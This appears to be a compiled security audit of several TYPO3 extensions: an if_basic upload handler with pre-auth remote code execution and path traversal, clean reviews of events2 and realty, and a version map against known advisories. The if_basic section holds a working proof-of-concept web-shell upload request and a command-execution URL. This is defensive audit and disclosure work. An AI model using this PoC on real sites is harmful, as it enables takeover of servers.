$GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include']['ajaxupload'] =
    'EXT:'.$_EXTKEY.'/Classes/Utility/AjaxUploadEid.php';
```

The handler (`Classes/Utility/AjaxUploadEid.php`, class `AjaxUploadController::init()`) takes `$_FILES['SelectedFile']`, "validates" it against a **client-supplied MIME type**, then writes it to `fileadmin/user_upload/<date>-<original-name>` using `move_uploaded_file()`. The extension/type of the original filename is preserved verbatim, the content-type check trusts attacker-controlled data, and the image-content check is commented out. `fileadmin/` is served directly by the web server in a default TYPO3 install, so an uploaded `.php` file is directly executable.

---

## Finding 1 — Unrestricted file upload → RCE (CRITICAL, PRE-AUTH)

**Severity:** Critical
**Pre-auth:** Yes — eID handlers run before any FE/BE authentication; no login, CSRF token, or referer check exists anywhere in the flow.

**Source** — `Classes/Utility/AjaxUploadEid.php`, `init()`:
```php
$this->uploadedFile = $_FILES['SelectedFile'];      // fully attacker-controlled multipart upload
$this->validateFile();
...
$newFile = $this->targetFolder . date('Y-m-d--H-i-s') . '-' . $this->uploadedFile['name'];
if (!move_uploaded_file($this->uploadedFile['tmp_name'], $newFile)) { ... }   // SINK
```

**Broken validation** — `validateFile()`:
```php
// if(!getimagesize($this->uploadedFile['tmp_name'])){ ... }   // <-- commented out, disabled
if(!in_array($this->uploadedFile['type'], $this->allowedMimeTypes)) {   // 'type' = client-sent Content-Type
    array_push($this->errors,'Unsupported filetype uploaded.');
}
if($this->uploadedFile['size'] > $this->allowedFileSize){ ... }
```

**Tainted path:**
`$_FILES['SelectedFile']['type']` and `['name']` (both set by the client in the multipart body)
→ `validateFile()` only compares `['type']` against `['image/png','image/jpeg','image/gif']`
→ the sole real content check (`getimagesize`) is commented out
→ `['name']` (extension intact) is appended to `targetFolder` and passed to `move_uploaded_file()`
→ file lands at `fileadmin/user_upload/<timestamp>-evil.php`, which the web server executes on request.

**Why it is exploitable:**
- `$_FILES[...]['type']` is the browser/attacker-declared MIME string, not derived from content. Sending `Content-Type: image/png` for the `SelectedFile` part passes the whitelist while the actual bytes are PHP.
- The filename extension is never checked or normalized; `date('Y-m-d--H-i-s') . '-' . name` keeps `evil.php` as `.php`.
- `targetFolder` defaults to `fileadmin/user_upload/` (web-reachable). It can only be overridden by TypoScript (`plugin.tx_powermail.settings.setup.ajaxUpload.targetFolder`), not by the attacker — and the default is already exploitable.
- No auth gate: eID is dispatched by TYPO3's frontend before authentication; anyone on the network can call it.

**PoC request:**
```
POST /index.php?eID=ajaxupload HTTP/1.1
Host: victim
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="SelectedFile"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['c']); ?>
--X--
```
Response: `{"status":"done","fileName":"fileadmin/user_upload/2026-08-04--12-00-00-shell.php"}`
Then: `GET /fileadmin/user_upload/2026-08-04--12-00-00-shell.php?c=id` → command execution.
(The timestamp prefix is returned in the JSON `fileName`, so the exact URL is known to the attacker; even if it weren't, it is second-granularity and trivially brute-forced.)

---

## Finding 2 — Path traversal in target path (HIGH, PRE-AUTH)

**Severity:** High (secondary; subsumed by Finding 1 for impact)
**Pre-auth:** Yes.

`$this->uploadedFile['name']` is concatenated into the destination with no `basename()`/sanitization:
```php
$newFile = $this->targetFolder . date('Y-m-d--H-i-s') . '-' . $this->uploadedFile['name'];
move_uploaded_file($this->uploadedFile['tmp_name'], $newFile);
```
A multipart `filename` containing a path separator (e.g. `x/../../../typo3conf/evil.php`) resolves to `fileadmin/user_upload/<ts>-x/../../../typo3conf/evil.php`, letting the attacker escape `user_upload/` and write elsewhere in the docroot (subject to directory existence / write permissions). This widens where the RCE payload can be planted. Note the date prefix defeats a bare leading `../` (the segment becomes `<ts>-..`), but a name of the form `dir/../../...` traverses normally because the `/` splits the prefix from the `..` segments.

---

## Finding 3 — Missing authentication / unauthenticated PID injection (INFO)

`initTSSettings()` takes `$_GET['id']` unsanitized as the page id used to bootstrap `TypoScriptFrontendController` and `EidUtility::initFeUser()`. This confirms the endpoint runs with no auth and lets an attacker choose which page's TypoScript is loaded (thereby influencing `allowedMimeTypes`/`allowedFileSize`/`targetFolder` if any page in the tree defines weaker values). Lower impact than Findings 1–2 but reinforces that the whole handler is unauthenticated.

---

## Known CVEs / advisories
No dedicated public advisory (TYPO3-EXT-SA / GHSA / CVE) was found for `if_basic` / `interfrog/if_basic` v2.0.0. The pattern matches the class of "Unrestricted File Upload" issues TYPO3 tracks in core (e.g. TYPO3-CORE-SA-2021-002, TYPO3-CORE-SA-2025-014), but this is an extension-specific, unreported bug. Recommend responsible disclosure to the vendor (info@interfrog.de) and immediate mitigation.

**Remediation:** enforce a server-side extension allowlist (reject anything but real image extensions), validate real content with `getimagesize()`/finfo, `basename()` the filename, drop the trust in `$_FILES[...]['type']`, and add an authentication/CSRF check to the eID.

**Sources:** [TYPO3-CORE-SA-2021-002 (Unrestricted File Upload in Form Framework)](https://typo3.org/security/advisory/typo3-core-sa-2021-002), [TYPO3-CORE-SA-2025-014 (Unrestricted File Upload in FAL)](https://typo3.org/security/advisory/typo3-core-sa-2025-014), [CVE-2025-47939 advisory](https://github.com/advisories/GHSA-9hq9-cr36-4wpj)

### jweiland_events2

#### Security Audit — jweiland/events2

**Version audited:** 10.2.10 (ext_emconf.php / composer.json), TYPO3 v13.4 line
**Scope:** pre-auth exploitable vulnerabilities reachable from an unauthenticated frontend HTTP request.
**Summary:** No pre-auth exploitable vulnerability found. Every request-reachable SQL sink is parameterized (`createNamedParameter` / `quote` + `escapeLikeWildcards` / `MathUtility` / `intExplode`), rendered output is Fluid-escaped, the iCal download builds its own filename, there is no outbound fetch on any frontend path, and the entire event create/edit/delete flow is auth-gated by `RestrictAccessEventListener` (requires fe_user login + configured userGroup + assigned organizer). Findings below are the traced surfaces and why each is NOT exploitable, plus two low/informational notes.

---

## Pre-auth attack surface map

| Surface | Entry point | Auth | Notes |
|---|---|---|---|
| iCal download | `ICalController::downloadAction(int $dayUid)` | pre-auth | int arg, internal filename |
| Event search | `SearchController::show / listSearchResults(?Search)` | pre-auth | LIKE via `quote()`+`escapeLikeWildcards`, `setSearch` also `htmlspecialchars` |
| Day list/show | `DayController::list/show` | pre-auth | int args, parameterized |
| Location show | `LocationController::showAction(Location)` | pre-auth | Extbase model, escaped output |
| Video show | `VideoController::showAction(int $event)` | pre-auth | int arg |
| Calendar AJAX | `GetDaysForMonthMiddleware` (`ext-events2: getDaysForMonth`) | pre-auth | `MathUtility::forceIntegerInRange` + `intExplode` |
| Location autocomplete | `GetLocationsMiddleware` (`getLocations`) | pre-auth | `strip_tags`+`htmlspecialchars`, then `escapeLikeWildcards` |
| Sub-categories AJAX | `GetSubCategoriesMiddleware` (`getSubCategories`) | pre-auth | `(int)` cast |
| URI for day AJAX | `GetUriForDayMiddleware` (`getUriForDay`) | pre-auth | `MathUtility::forceIntegerInRange` |
| Attach organizer | `AttachOrganizerToEventMiddleware` | pre-auth trigger | only fires when fe_user has organizer; value is server-side user field |
| Event create/edit/delete | `ManagementController` | **auth-gated** | blocked by `RestrictAccessEventListener` |
| Reaction import | `ImportEventsReaction` | **auth-gated** | TYPO3 reaction secret required |

---

## Findings (traced source → sink)

### 1. Frontend event CREATE / stored XSS-injection — NOT pre-auth (auth-gated)
- **Severity:** N/A (mitigated by access control) · **Pre-auth:** No
- **Source:** `tx_events2_management[event][...]` → `ManagementController::createAction(Event $event)` (`Classes/Controller/ManagementController.php:94`)
- **Gate:** `RestrictAccessEventListener::isAccessAllowed()` (`Classes/EventListener/RestrictAccessEventListener.php:97-139`) runs in `preProcessControllerAction` for every Management action and forwards to `errorAction` unless: `settings.userGroup` configured, `frontend.user` is logged in, user is in that group, and the user has `tx_events2_organizer` set. Edit/update/delete additionally require `getIsCurrentUserAllowedOrganizer()`.
- **Sink behavior:** created event is forced `setHidden(true)` (`:96`) and only becomes visible after a backend editor activates it; fields render through Fluid (auto-escaped) and `detail_information` through `f:format.html(parseFuncTSPath: lib.parseFunc)` (RTE-sanitized).
- **Exploitability:** Not reachable pre-auth. Any stored-XSS would require a valid FE account in the allowed group *and* an editor to activate the record — outside the pre-auth threat model.

### 2. Event search filter → SQL — NOT vulnerable
- **Severity:** None · **Pre-auth:** Yes (surface), not exploitable
- **Source:** `search[search]`, `search[eventBegin/eventEnd]`, `search[mainCategory]`, `search[location]`, `search[storagePids][]` → `SearchController::listSearchResultsAction(?Search)` → `DayRepository::searchEvents()` (`Classes/Domain/Repository/DayRepository.php:204`)
- **Sink:** free-text LIKE at `DayRepository.php:223-234` uses `$queryBuilder->quote('%' . escapeLikeWildcards($search->getSearch()) . '%')`; `Search::setSearch()` additionally applies `htmlspecialchars` (`Classes/Domain/Model/Search.php:49`). Category/location/attendance use typed `createNamedParameter`; `storagePids` bound as `ArrayParameterType::INTEGER` in `DatabaseService::addConstraintForPid` (`Classes/Service/DatabaseService.php:212`).
- **Exploitability:** None — all tainted values are quoted/parameterized/typed.

### 3. iCal download → path traversal — NOT vulnerable
- **Severity:** None · **Pre-auth:** Yes (surface), not exploitable
- **Source:** `tx_events2_ical[dayUid]` → `ICalController::downloadAction(int $dayUid)` (`Classes/Controller/ICalController.php:36`)
- **Sink:** `DownloadHelper::forceDownloadFile()` (`Classes/Helper/DownloadHelper.php:66`) streams an **in-memory string**, not a filesystem path; filename is `ICalendarHelper::getEventUid()` = `'event' . uniqid(...)` (`Classes/Helper/ICalendarHelper.php:267`), fully server-generated. `$dayUid` is an `int` and only used as a DB identifier lookup.
- **Exploitability:** None — no user-controlled path segment; no filename injection (filename is not attacker-derived).

### 4. Location / poimap → SSRF — NOT present
- **Severity:** None · **Pre-auth:** Yes (surface), not exploitable
- **Trace:** `LocationController::showAction(Location)` and `LocationService` only run parameterized DB `SELECT`s (`Classes/Service/LocationService.php:28-51`). No `getUrl`/HTTP client on any frontend path. Map rendering is delegated to the optional `maps2` extension (not part of this codebase). The only `GeneralUtility::getUrl()` calls live in `Importer/JsonImporter.php:406` and `Importer/XmlImporter.php:531`, reachable only via the auth-gated reaction / scheduler task, not from a frontend request.
- **Exploitability:** No pre-auth SSRF.

### 5. Object injection / unserialize — NOT present
- No `unserialize()` of request data anywhere in `Classes/`. Extbase property mapping into the `Event`/`Search` models is type-constrained; `Search`/`Filter` are non-persisted DTOs.

### 6. Calendar / autocomplete AJAX middlewares → SQLi — NOT vulnerable
- **Source:** JSON POST body of the four `ext-events2` middlewares.
- **Sinks:** `GetDaysForMonthMiddleware` casts `month`/`year` via `MathUtility::forceIntegerInRange` and `categories`/`storagePages` via `GeneralUtility::intExplode`, then `DatabaseService::getDaysInRange()` binds everything with `createNamedParameter` (`Classes/Service/DatabaseService.php:75-155`). `GetSubCategoriesMiddleware` casts `(int)`. `GetLocationsMiddleware` runs `strip_tags`+`htmlspecialchars` then `escapeLikeWildcards`+`createNamedParameter` in `LocationRecordService::findLocations` (`Classes/Service/Record/LocationRecordService.php:31-61`). `GetUriForDayMiddleware` uses `forceIntegerInRange`.
- **Exploitability:** None.

---

## Low / Informational notes (not pre-auth exploitable)

- **iCal `LOCATION:` line not sanitized** — `ICalendarHelper::addEventLocation()` (`Classes/Helper/ICalendarHelper.php:182-187`) emits `getLocationAsString()` without the `sanitizeString()` applied to SUMMARY/DESCRIPTION. This is a theoretical iCal line-injection into a downloaded `.ics`, but the location string derives from backend-managed `tx_events2_domain_model_location` records (a FE creator selects a location by uid, not free text), so it is not attacker-controlled pre-auth. Cosmetic/robustness fix at best.
- **`CreateYoutubeUriViewHelper` fallback** — on a non-matching link it returns `'//www.youtube.com/embed/' . $link` with the raw value (`Classes/ViewHelpers/CreateYoutubeUriViewHelper.php:57`). Rendered into an iframe `src`, Fluid escapes the attribute; the field is organizer/backend-managed (post-auth). Not pre-auth.
- **`storagePids` in search** can be supplied by the client (`search[storagePids][]`) and widens which storage folders are queried, but values are INT-bound (no SQLi) and events are public content — negligible info-disclosure at most.

---

## Known CVEs / advisories cross-reference

- No public CVE / TYPO3-EXT-SA advisory is known to affect **events2 10.2.10** (current release for TYPO3 v13.4, 2025).
- The code shows the defensive patterns that historically hardened this extension: the frontend event-management flow is fully gated behind `RestrictAccessEventListener`, newly created events are force-hidden pending editor activation, and all AJAX/search DB access is parameterized. No regression of those mitigations was found.
- Recommendation: track the `jweiland-net/events2` GitHub security advisories feed; nothing in this version requires remediation for the pre-auth threat model.

### oliverklee_realty

#### Security Audit — oliverklee/realty (Realty Manager) v3.0.2

**Target eID:** `realty` (AJAX dispatcher)
**TYPO3 constraint:** 7.6.23–8.7.99 / PHP 5.5–7.2
**Focus:** SQL injection (legacy raw WHERE), reflected XSS in search, IDOR
**Verdict:** No exploitable pre-auth vulnerability found via the eID. The dispatcher casts its only attacker input to `(int)`, and the district title output is HTML-encoded. An unsafe raw-concatenation WHERE clause exists downstream but is unreachable with tainted data because of the int cast.

---

## Summary

`ext_localconf.php` registers the eID pre-auth:

```php
$GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include']['realty'] = 'EXT:realty/Ajax/tx_realty_Ajax_Dispatcher.php';
```

`Ajax/tx_realty_Ajax_Dispatcher.php` exposes exactly one action — a city→district drop-down:

```php
$cityUid = (int)\TYPO3\CMS\Core\Utility\GeneralUtility::_GET('city');   // int cast
$showWithNumbers = (\TYPO3\CMS\Core\Utility\GeneralUtility::_GET('type') === 'withNumber');  // strict bool
if ($cityUid > 0) {
    $output = \tx_realty_Ajax_DistrictSelector::render($cityUid, $showWithNumbers);
}
```

Both request parameters are neutralized at the source (`(int)` and an `=== 'withNumber'` boolean), so no attacker-controlled string reaches any downstream sink. The SQLi / XSS / IDOR hunt on this eID is disproven below with the exact sinks.

---

## Analysis

### SQL injection — sink exists but is unreachable (NOT exploitable)

`DistrictSelector::render()` calls the mapper:

```php
foreach ($districtMapper->findAllByCityUid($cityUid) as $district) { ... }
```

**Unsafe sink** — `Mapper/class.tx_realty_Mapper_District.php:findAllByCityUid()`:
```php
public function findAllByCityUid($uid)
{
    return $this->findByWhereClause('city = ' . $uid, 'title ASC');   // raw concatenation
}
```

This is textbook unsafe string concatenation into a WHERE clause. **However**, the only caller reachable from the eID is the dispatcher, which passes `$cityUid = (int)_GET('city')`. An integer cannot carry SQL metacharacters, so the injection is not reachable pre-auth. `$cityUid` also gates on `> 0`. There is no code path from the eID that feeds a non-integer into `findAllByCityUid`.

`countByDistrict()` (Mapper/class.tx_realty_Mapper_RealtyObject.php) takes a `tx_realty_Model_District` object and an `$additionalWhereClause` that defaults to `''` and is not attacker-controlled on this path.

### Reflected XSS in the rendered list (NOT exploitable)

`DistrictSelector::render()` HTML-encodes both dynamic values:
```php
$options .= '<option value="' . $district->getUid() . '">' .   // uid is int from DB
    htmlspecialchars($district->getTitle()) .                  // encoded
    $displayedNumber . "</option>\n";
```
`getUid()` returns an integer DB uid and `getTitle()` is passed through `htmlspecialchars()`. No reflected request value is echoed into the response — the `city`/`type` inputs never appear in `$output`. No XSS.

### IDOR (NOT a meaningful finding)

The endpoint only enumerates public district records belonging to a city uid. There is no per-object authorization to bypass and no sensitive data returned (district title + public object counts), so there is no consequential IDOR.

---

## PoC

None. `GET /index.php?eID=realty&city=1%20OR%201=1&type=withNumber` is evaluated as `city = 0` (the `(int)` cast turns `"1 OR 1=1"` into `1`, and any non-numeric string into `0`), so no injection occurs; a numeric `city` simply returns that city's district `<option>` list with encoded titles.

## Known CVEs / advisories
No dedicated public advisory (TYPO3-EXT-SA / GHSA / CVE) was found for `realty` / `oliverklee/realty` at v3.0.2 concerning this eID. (Oliver Klee has issued advisories for other extensions, e.g. TYPO3-EXT-SA-2022-006 for `seminars`, but none applicable here.) The raw-WHERE concatenation in `findAllByCityUid` should still be hardened defensively (`intval`/quoting) in case another caller ever passes untrusted input.

**Sources:** [TYPO3 Security Advisories](https://typo3.org/help/security-advisories), [oliverklee/ext-realty (GitHub)](https://github.com/oliverklee/ext-realty)

## Known-CVE version map (without source)
#### TYPO3 Extensions — Known-CVE / Advisory Version Map

**Method:** "Without source" identification. Installed versions were read from each
extension's `ext_emconf.php` (`'version' => ...`) and/or `composer.json`. Each version
is compared against the affected range of publicly known TYPO3 Security Advisories
(TYPO3-EXT-SA-*) / CVEs **from analyst knowledge only** — no code was audited.

**Corpus:** `/home/user/sources/code/typo3-extensions/` (3350 extension dirs).
**Date of assessment:** 2026-08-04.

> Important honesty caveats:
> - This corpus is overwhelmingly a **current TER snapshot** — most extensions are at
>   their latest major version, so they are *patched against all historical advisories*.
>   The interesting cases are the few extensions pinned/abandoned at old versions.
> - Advisory IDs are only stated where the analyst is confident. Where the *class* of a
>   known issue is recalled but the exact ID is not certain, the cell says
>   **"confirm advisory id"** and the verdict is **uncertain** — do NOT treat those as
>   confirmed. Verify every AFFECTED/uncertain row against the official TER security
>   bulletin (https://typo3.org/help/security-advisories) before acting.
> - No CVE/SA identifier in this document was invented. Absent-but-suspected IDs are
>   explicitly marked as needing confirmation.

## Summary counts
- Extensions checked with a definite version: **47** (table below).
- Likely **AFFECTED** by a known advisory at the installed version: **2** (high confidence)
  + several **uncertain** rows flagged for manual bulletin check.
- Everything else: **patched** (installed version is at/above all known fixed versions).

---

## Findings table

| # | Extension (dir) | Installed ver | Advisory / CVE | Vuln class | Affected range (known) | Verdict |
|---|-----------------|---------------|----------------|------------|------------------------|---------|
| 1 | bvbmedia_multishop | **5.1.110** | TYPO3-EXT-SA for "multishop" multiple vulns — confirm advisory id | SQLi + insecure deserialization + arbitrary file ops (critical) | Abandoned line; ext targets only TYPO3 6.2–7.9; no fixed release ships | **AFFECTED** (high) |
| 2 | aoepeople_realurl | **1.12.8.19** (AOE fork) | TYPO3-EXT-SA-2017-005 (realurl) | XSS via crafted URL/path | realurl 1.x < 1.12.9 | **AFFECTED / likely** (fork numbering — verify) |
| 3 | ameos_ameos_filemanager | **3.1.2** (state: beta) | confirm advisory id | Frontend file manager: access-control bypass / arbitrary file read-write class | unknown fixed ver | uncertain |
| 4 | jambagecom_jfmulticontent | **2.16.0** | confirm advisory id (known jf_multicontent XSS) | Stored/reflected XSS | older 2.x; 2.16.0 may already include fix | uncertain |
| 5 | mblaschke_metaseo | **3.0.0** | confirm advisory id (metaseo sitemap XSS/open-redirect class) | XSS / open redirect in sitemap output | abandoned line | uncertain |
| 6 | webdevops_metaseo | **3.0.0** | same as #5 (predecessor package name) | XSS / open redirect | abandoned line | uncertain |
| 7 | felixnagel_pluploadfe | **9.0.3-dev** | confirm advisory id | FE upload: unrestricted/arbitrary file upload class | unknown | uncertain (dev build) |
| 8 | daniel-pfeil_samlauthentication | emconf **4.1.2** / composer **5.0.0** | depends on bundled SAML lib | SAML signature-wrapping / auth bypass (lib-dependent) | lib-version dependent | uncertain |
| 9 | georgringer_news | **14.0.3** | TYPO3-EXT-SA-2017-004 & later news SAs | historical SQLi/XSS/IDOR | news < 4.3 / < 5.3.x etc. | patched (far above) |
| 10 | in2code_powermail | **13.1.0** | historical powermail SAs (spam/XSS) | XSS / mail-injection (historical) | powermail < 3.x/older 2.x | patched |
| 11 | in2code_femanager | **13.3.3** | TYPO3-EXT-SA-2016-022 (femanager) + later IDOR | account takeover / privilege escalation / IDOR | femanager < 1.4 / older | patched |
| 12 | in2code_femanagerextended | **4.0.0** | — | (addon) inherits femanager | n/a | patched/uncertain |
| 13 | dmitryd_typo3-realurl | **2.6.3** | TYPO3-EXT-SA-2017-005 | XSS | realurl 2.x < ~2.1.6 | patched (maintained fork) |
| 14 | helhum_realurl | **2.1.8** | TYPO3-EXT-SA-2017-005 | XSS | realurl 2.x < ~2.1.6 | patched (2.1.8 ≥ fix) |
| 15 | bmack_realurl | **3.1.1** | TYPO3-EXT-SA-2017-005 | XSS | realurl < fixed 3.x | patched |
| 16 | apache-solr-for-typo3_solr | **14.0.0-RC1** | historical solr SAs | historical info-disclosure/XSS | old 1.x–6.x | patched (note: RC/pre-release) |
| 17 | gridelementsteam_gridelements | **13.0.1** | historical gridelements SA | old XSS/access | gridelements 1.x/2.x | patched |
| 18 | mask_mask | **9.0.10** | — (no confident advisory for this line) | — | — | patched/uncertain |
| 19 | rfuehricht_formhandler | **14.0.2** | TYPO3-EXT-SA-2016-011 (formhandler) | XSS / SQLi (historical) | formhandler < 2.x fix | patched |
| 20 | t3_dce | **3.3.2** | historical DCE SQLi SA | SQL injection (historical) | DCE 0.x/1.x | patched |
| 21 | derhansen_sf_event_mgt | **9.0.1** | historical sf_event_mgt SA | data exposure (historical) | old 2.x/3.x | patched |
| 22 | derhansen_sf_yubikey | **7.0.2** | — | 2FA provider | — | patched |
| 23 | extcode_cart | **12.0.0** | — | e-commerce | — | patched |
| 24 | aoepeople_crawler | **13.0.0** | historical crawler SA | info disclosure (historical) | crawler < ~9.x | patched |
| 25 | causal_restdoc | **2.1.0** | historical reST/sphinx file-disclosure class | local file disclosure (historical) | old 1.x | patched/uncertain |
| 26 | causal_staffdirectory | **2.1.1** | — | — | — | patched |
| 27 | causal_image_autoresize | **2.5.3** | — | — | — | patched |
| 28 | causal_ig_ldap_sso_auth | **4.3.0-dev** | confirm advisory id | LDAP/SSO auth logic (dev build) | unknown | uncertain (dev) |
| 29 | oliverklee_feuserextrafields | **7.1.0** | — | — | — | patched |
| 30 | directmailteam_direct-mail | **9.5.2** | historical direct_mail SA | XSS / info disclosure (historical) | direct_mail < 5.x/older | patched |
| 31 | directmailteam_direct-mail-subscription | **2.0.4** | — | — | — | patched |
| 32 | azich_direct-mail | **6.0.0-dev** | — (distinct pkg) | — | — | uncertain (dev) |
| 33 | bitmotion_auth0 | **14.0.7** | historical auth0 SA | auth bypass (historical) | old 3.x | patched |
| 34 | bitmotion_secure-downloads | **14.0.1** | historical secure_downloads SA | access bypass / path traversal (historical) | secure_downloads < ~5.x | patched |
| 35 | beechit_fal-securedownload | **6.0.3** | historical fal_securedownload SA | access-control bypass (historical) | old 1.x/2.x | patched |
| 36 | evoweb_store-finder | **9.0.0** | TYPO3-EXT-SA-2016-013 (store_finder) — confirm id | SQLi / XSS (historical) | store_finder < ~2.x | patched |
| 37 | evoweb_recaptcha | **14.1.2** | — | captcha | — | patched |
| 38 | evoweb_sf-register | **14.0.2** | historical sr_feuser/register-class SA | reg/account issues (historical) | old versions | patched |
| 39 | derhansen_fe_change_pwd | **6.0.2** | — | pwd change | — | patched |
| 40 | fluidtypo3_flux | **12.0.0** | historical flux/fluidcontent SA class | fluid template injection (historical) | old 7.x | patched |
| 41 | fluidtypo3_vhs | **8.0.0** | historical vhs SA class | — | old versions | patched |
| 42 | fluidtypo3_fluidcontent | **5.2.0** | historical SA class | — | old versions | patched |
| 43 | fluidtypo3_fluidpages | **5.0.0** | historical SA class | — | old versions | patched |
| 44 | cobweb_external_import | **8.2.0** | — | — | — | patched |
| 45 | friendsoftypo3_rsaauth | **10.0.2** | (rsaauth extracted from core) | — | — | patched |
| 46 | aimeos_aimeos-typo3 | **26.7.1** | historical aimeos SA | old shop vulns | aimeos < ~19.x | patched |
| 47 | nitsan_ns-comments | **14.0.1** | confirm advisory id (NITSAN XSS class) | possible stored XSS in comments | unknown | uncertain (recent → likely patched) |

---

## Notes / reasoning

- **Multishop (bvbmedia_multishop 5.1.110)** is the single most serious finding. Its
  `ext_emconf.php` declares `constraints => typo3 => '6.2.5-7.9.99'`, i.e. it only ever
  supported TYPO3 6.2–7.9 and has been abandoned. Multishop is historically notorious for
  multiple *critical* server-side issues (SQL injection, insecure deserialization,
  arbitrary file operations). No maintained/fixed release exists for this line, so the
  installed 5.1.110 should be treated as **exploitable**. Confirm the exact TYPO3-EXT-SA
  advisory number against the TER bulletin before publishing an ID.

- **RealURL forks:** The maintained forks (dmitryd 2.6.3, helhum 2.1.8, bmack 3.1.1) are
  past the TYPO3-EXT-SA-2017-005 XSS fix and are patched. The **aoepeople fork
  1.12.8.19** is on the old realurl 1.x line, which is *below* the 1.12.9 fix boundary —
  treat as **likely AFFECTED (XSS)**, but the AOE-specific version numbering means the
  fix may have been back-ported; verify.

- The "uncertain" rows (ameos_filemanager, jfmulticontent, metaseo x2, pluploadfe,
  samlauthentication, ig_ldap_sso_auth, ns-comments) are extensions whose *class* of
  historical issue is recalled but where I cannot confidently assert the installed
  version is inside the affected range. Frontend file-manager / file-upload extensions
  (ameos_filemanager beta, pluploadfe dev) are inherently high-risk and warrant a manual
  bulletin lookup and, ideally, a targeted code check.

- Everything marked **patched** is at a major version well above every advisory I know of
  for that extension. That verdict is only as good as analyst knowledge of the advisory
  history — a fresh advisory published after the knowledge cutoff would not be reflected
  here.

- Extensions the brief named but which are **not present as canonical dirs** in this
  corpus: `sr_freecap`, `cal`, `tt_news`, `sr_feuser_register`, `ke_search`,
  `indexed_search` (core), `wt_directory`, `sg_zfe`. Only look-alikes / forks exist.

## Recommended next steps
1. Confirm the multishop advisory ID(s) and quarantine/remove that extension.
2. Verify the aoepeople_realurl fork against realurl SA-2017-005.
3. Manually check the "uncertain" file-upload / file-manager extensions against the TER
   bulletin and (if kept) a short source review of their access checks.

## CodeQL mass-scan candidates (intra-extension, all 3350 exts)
```
```
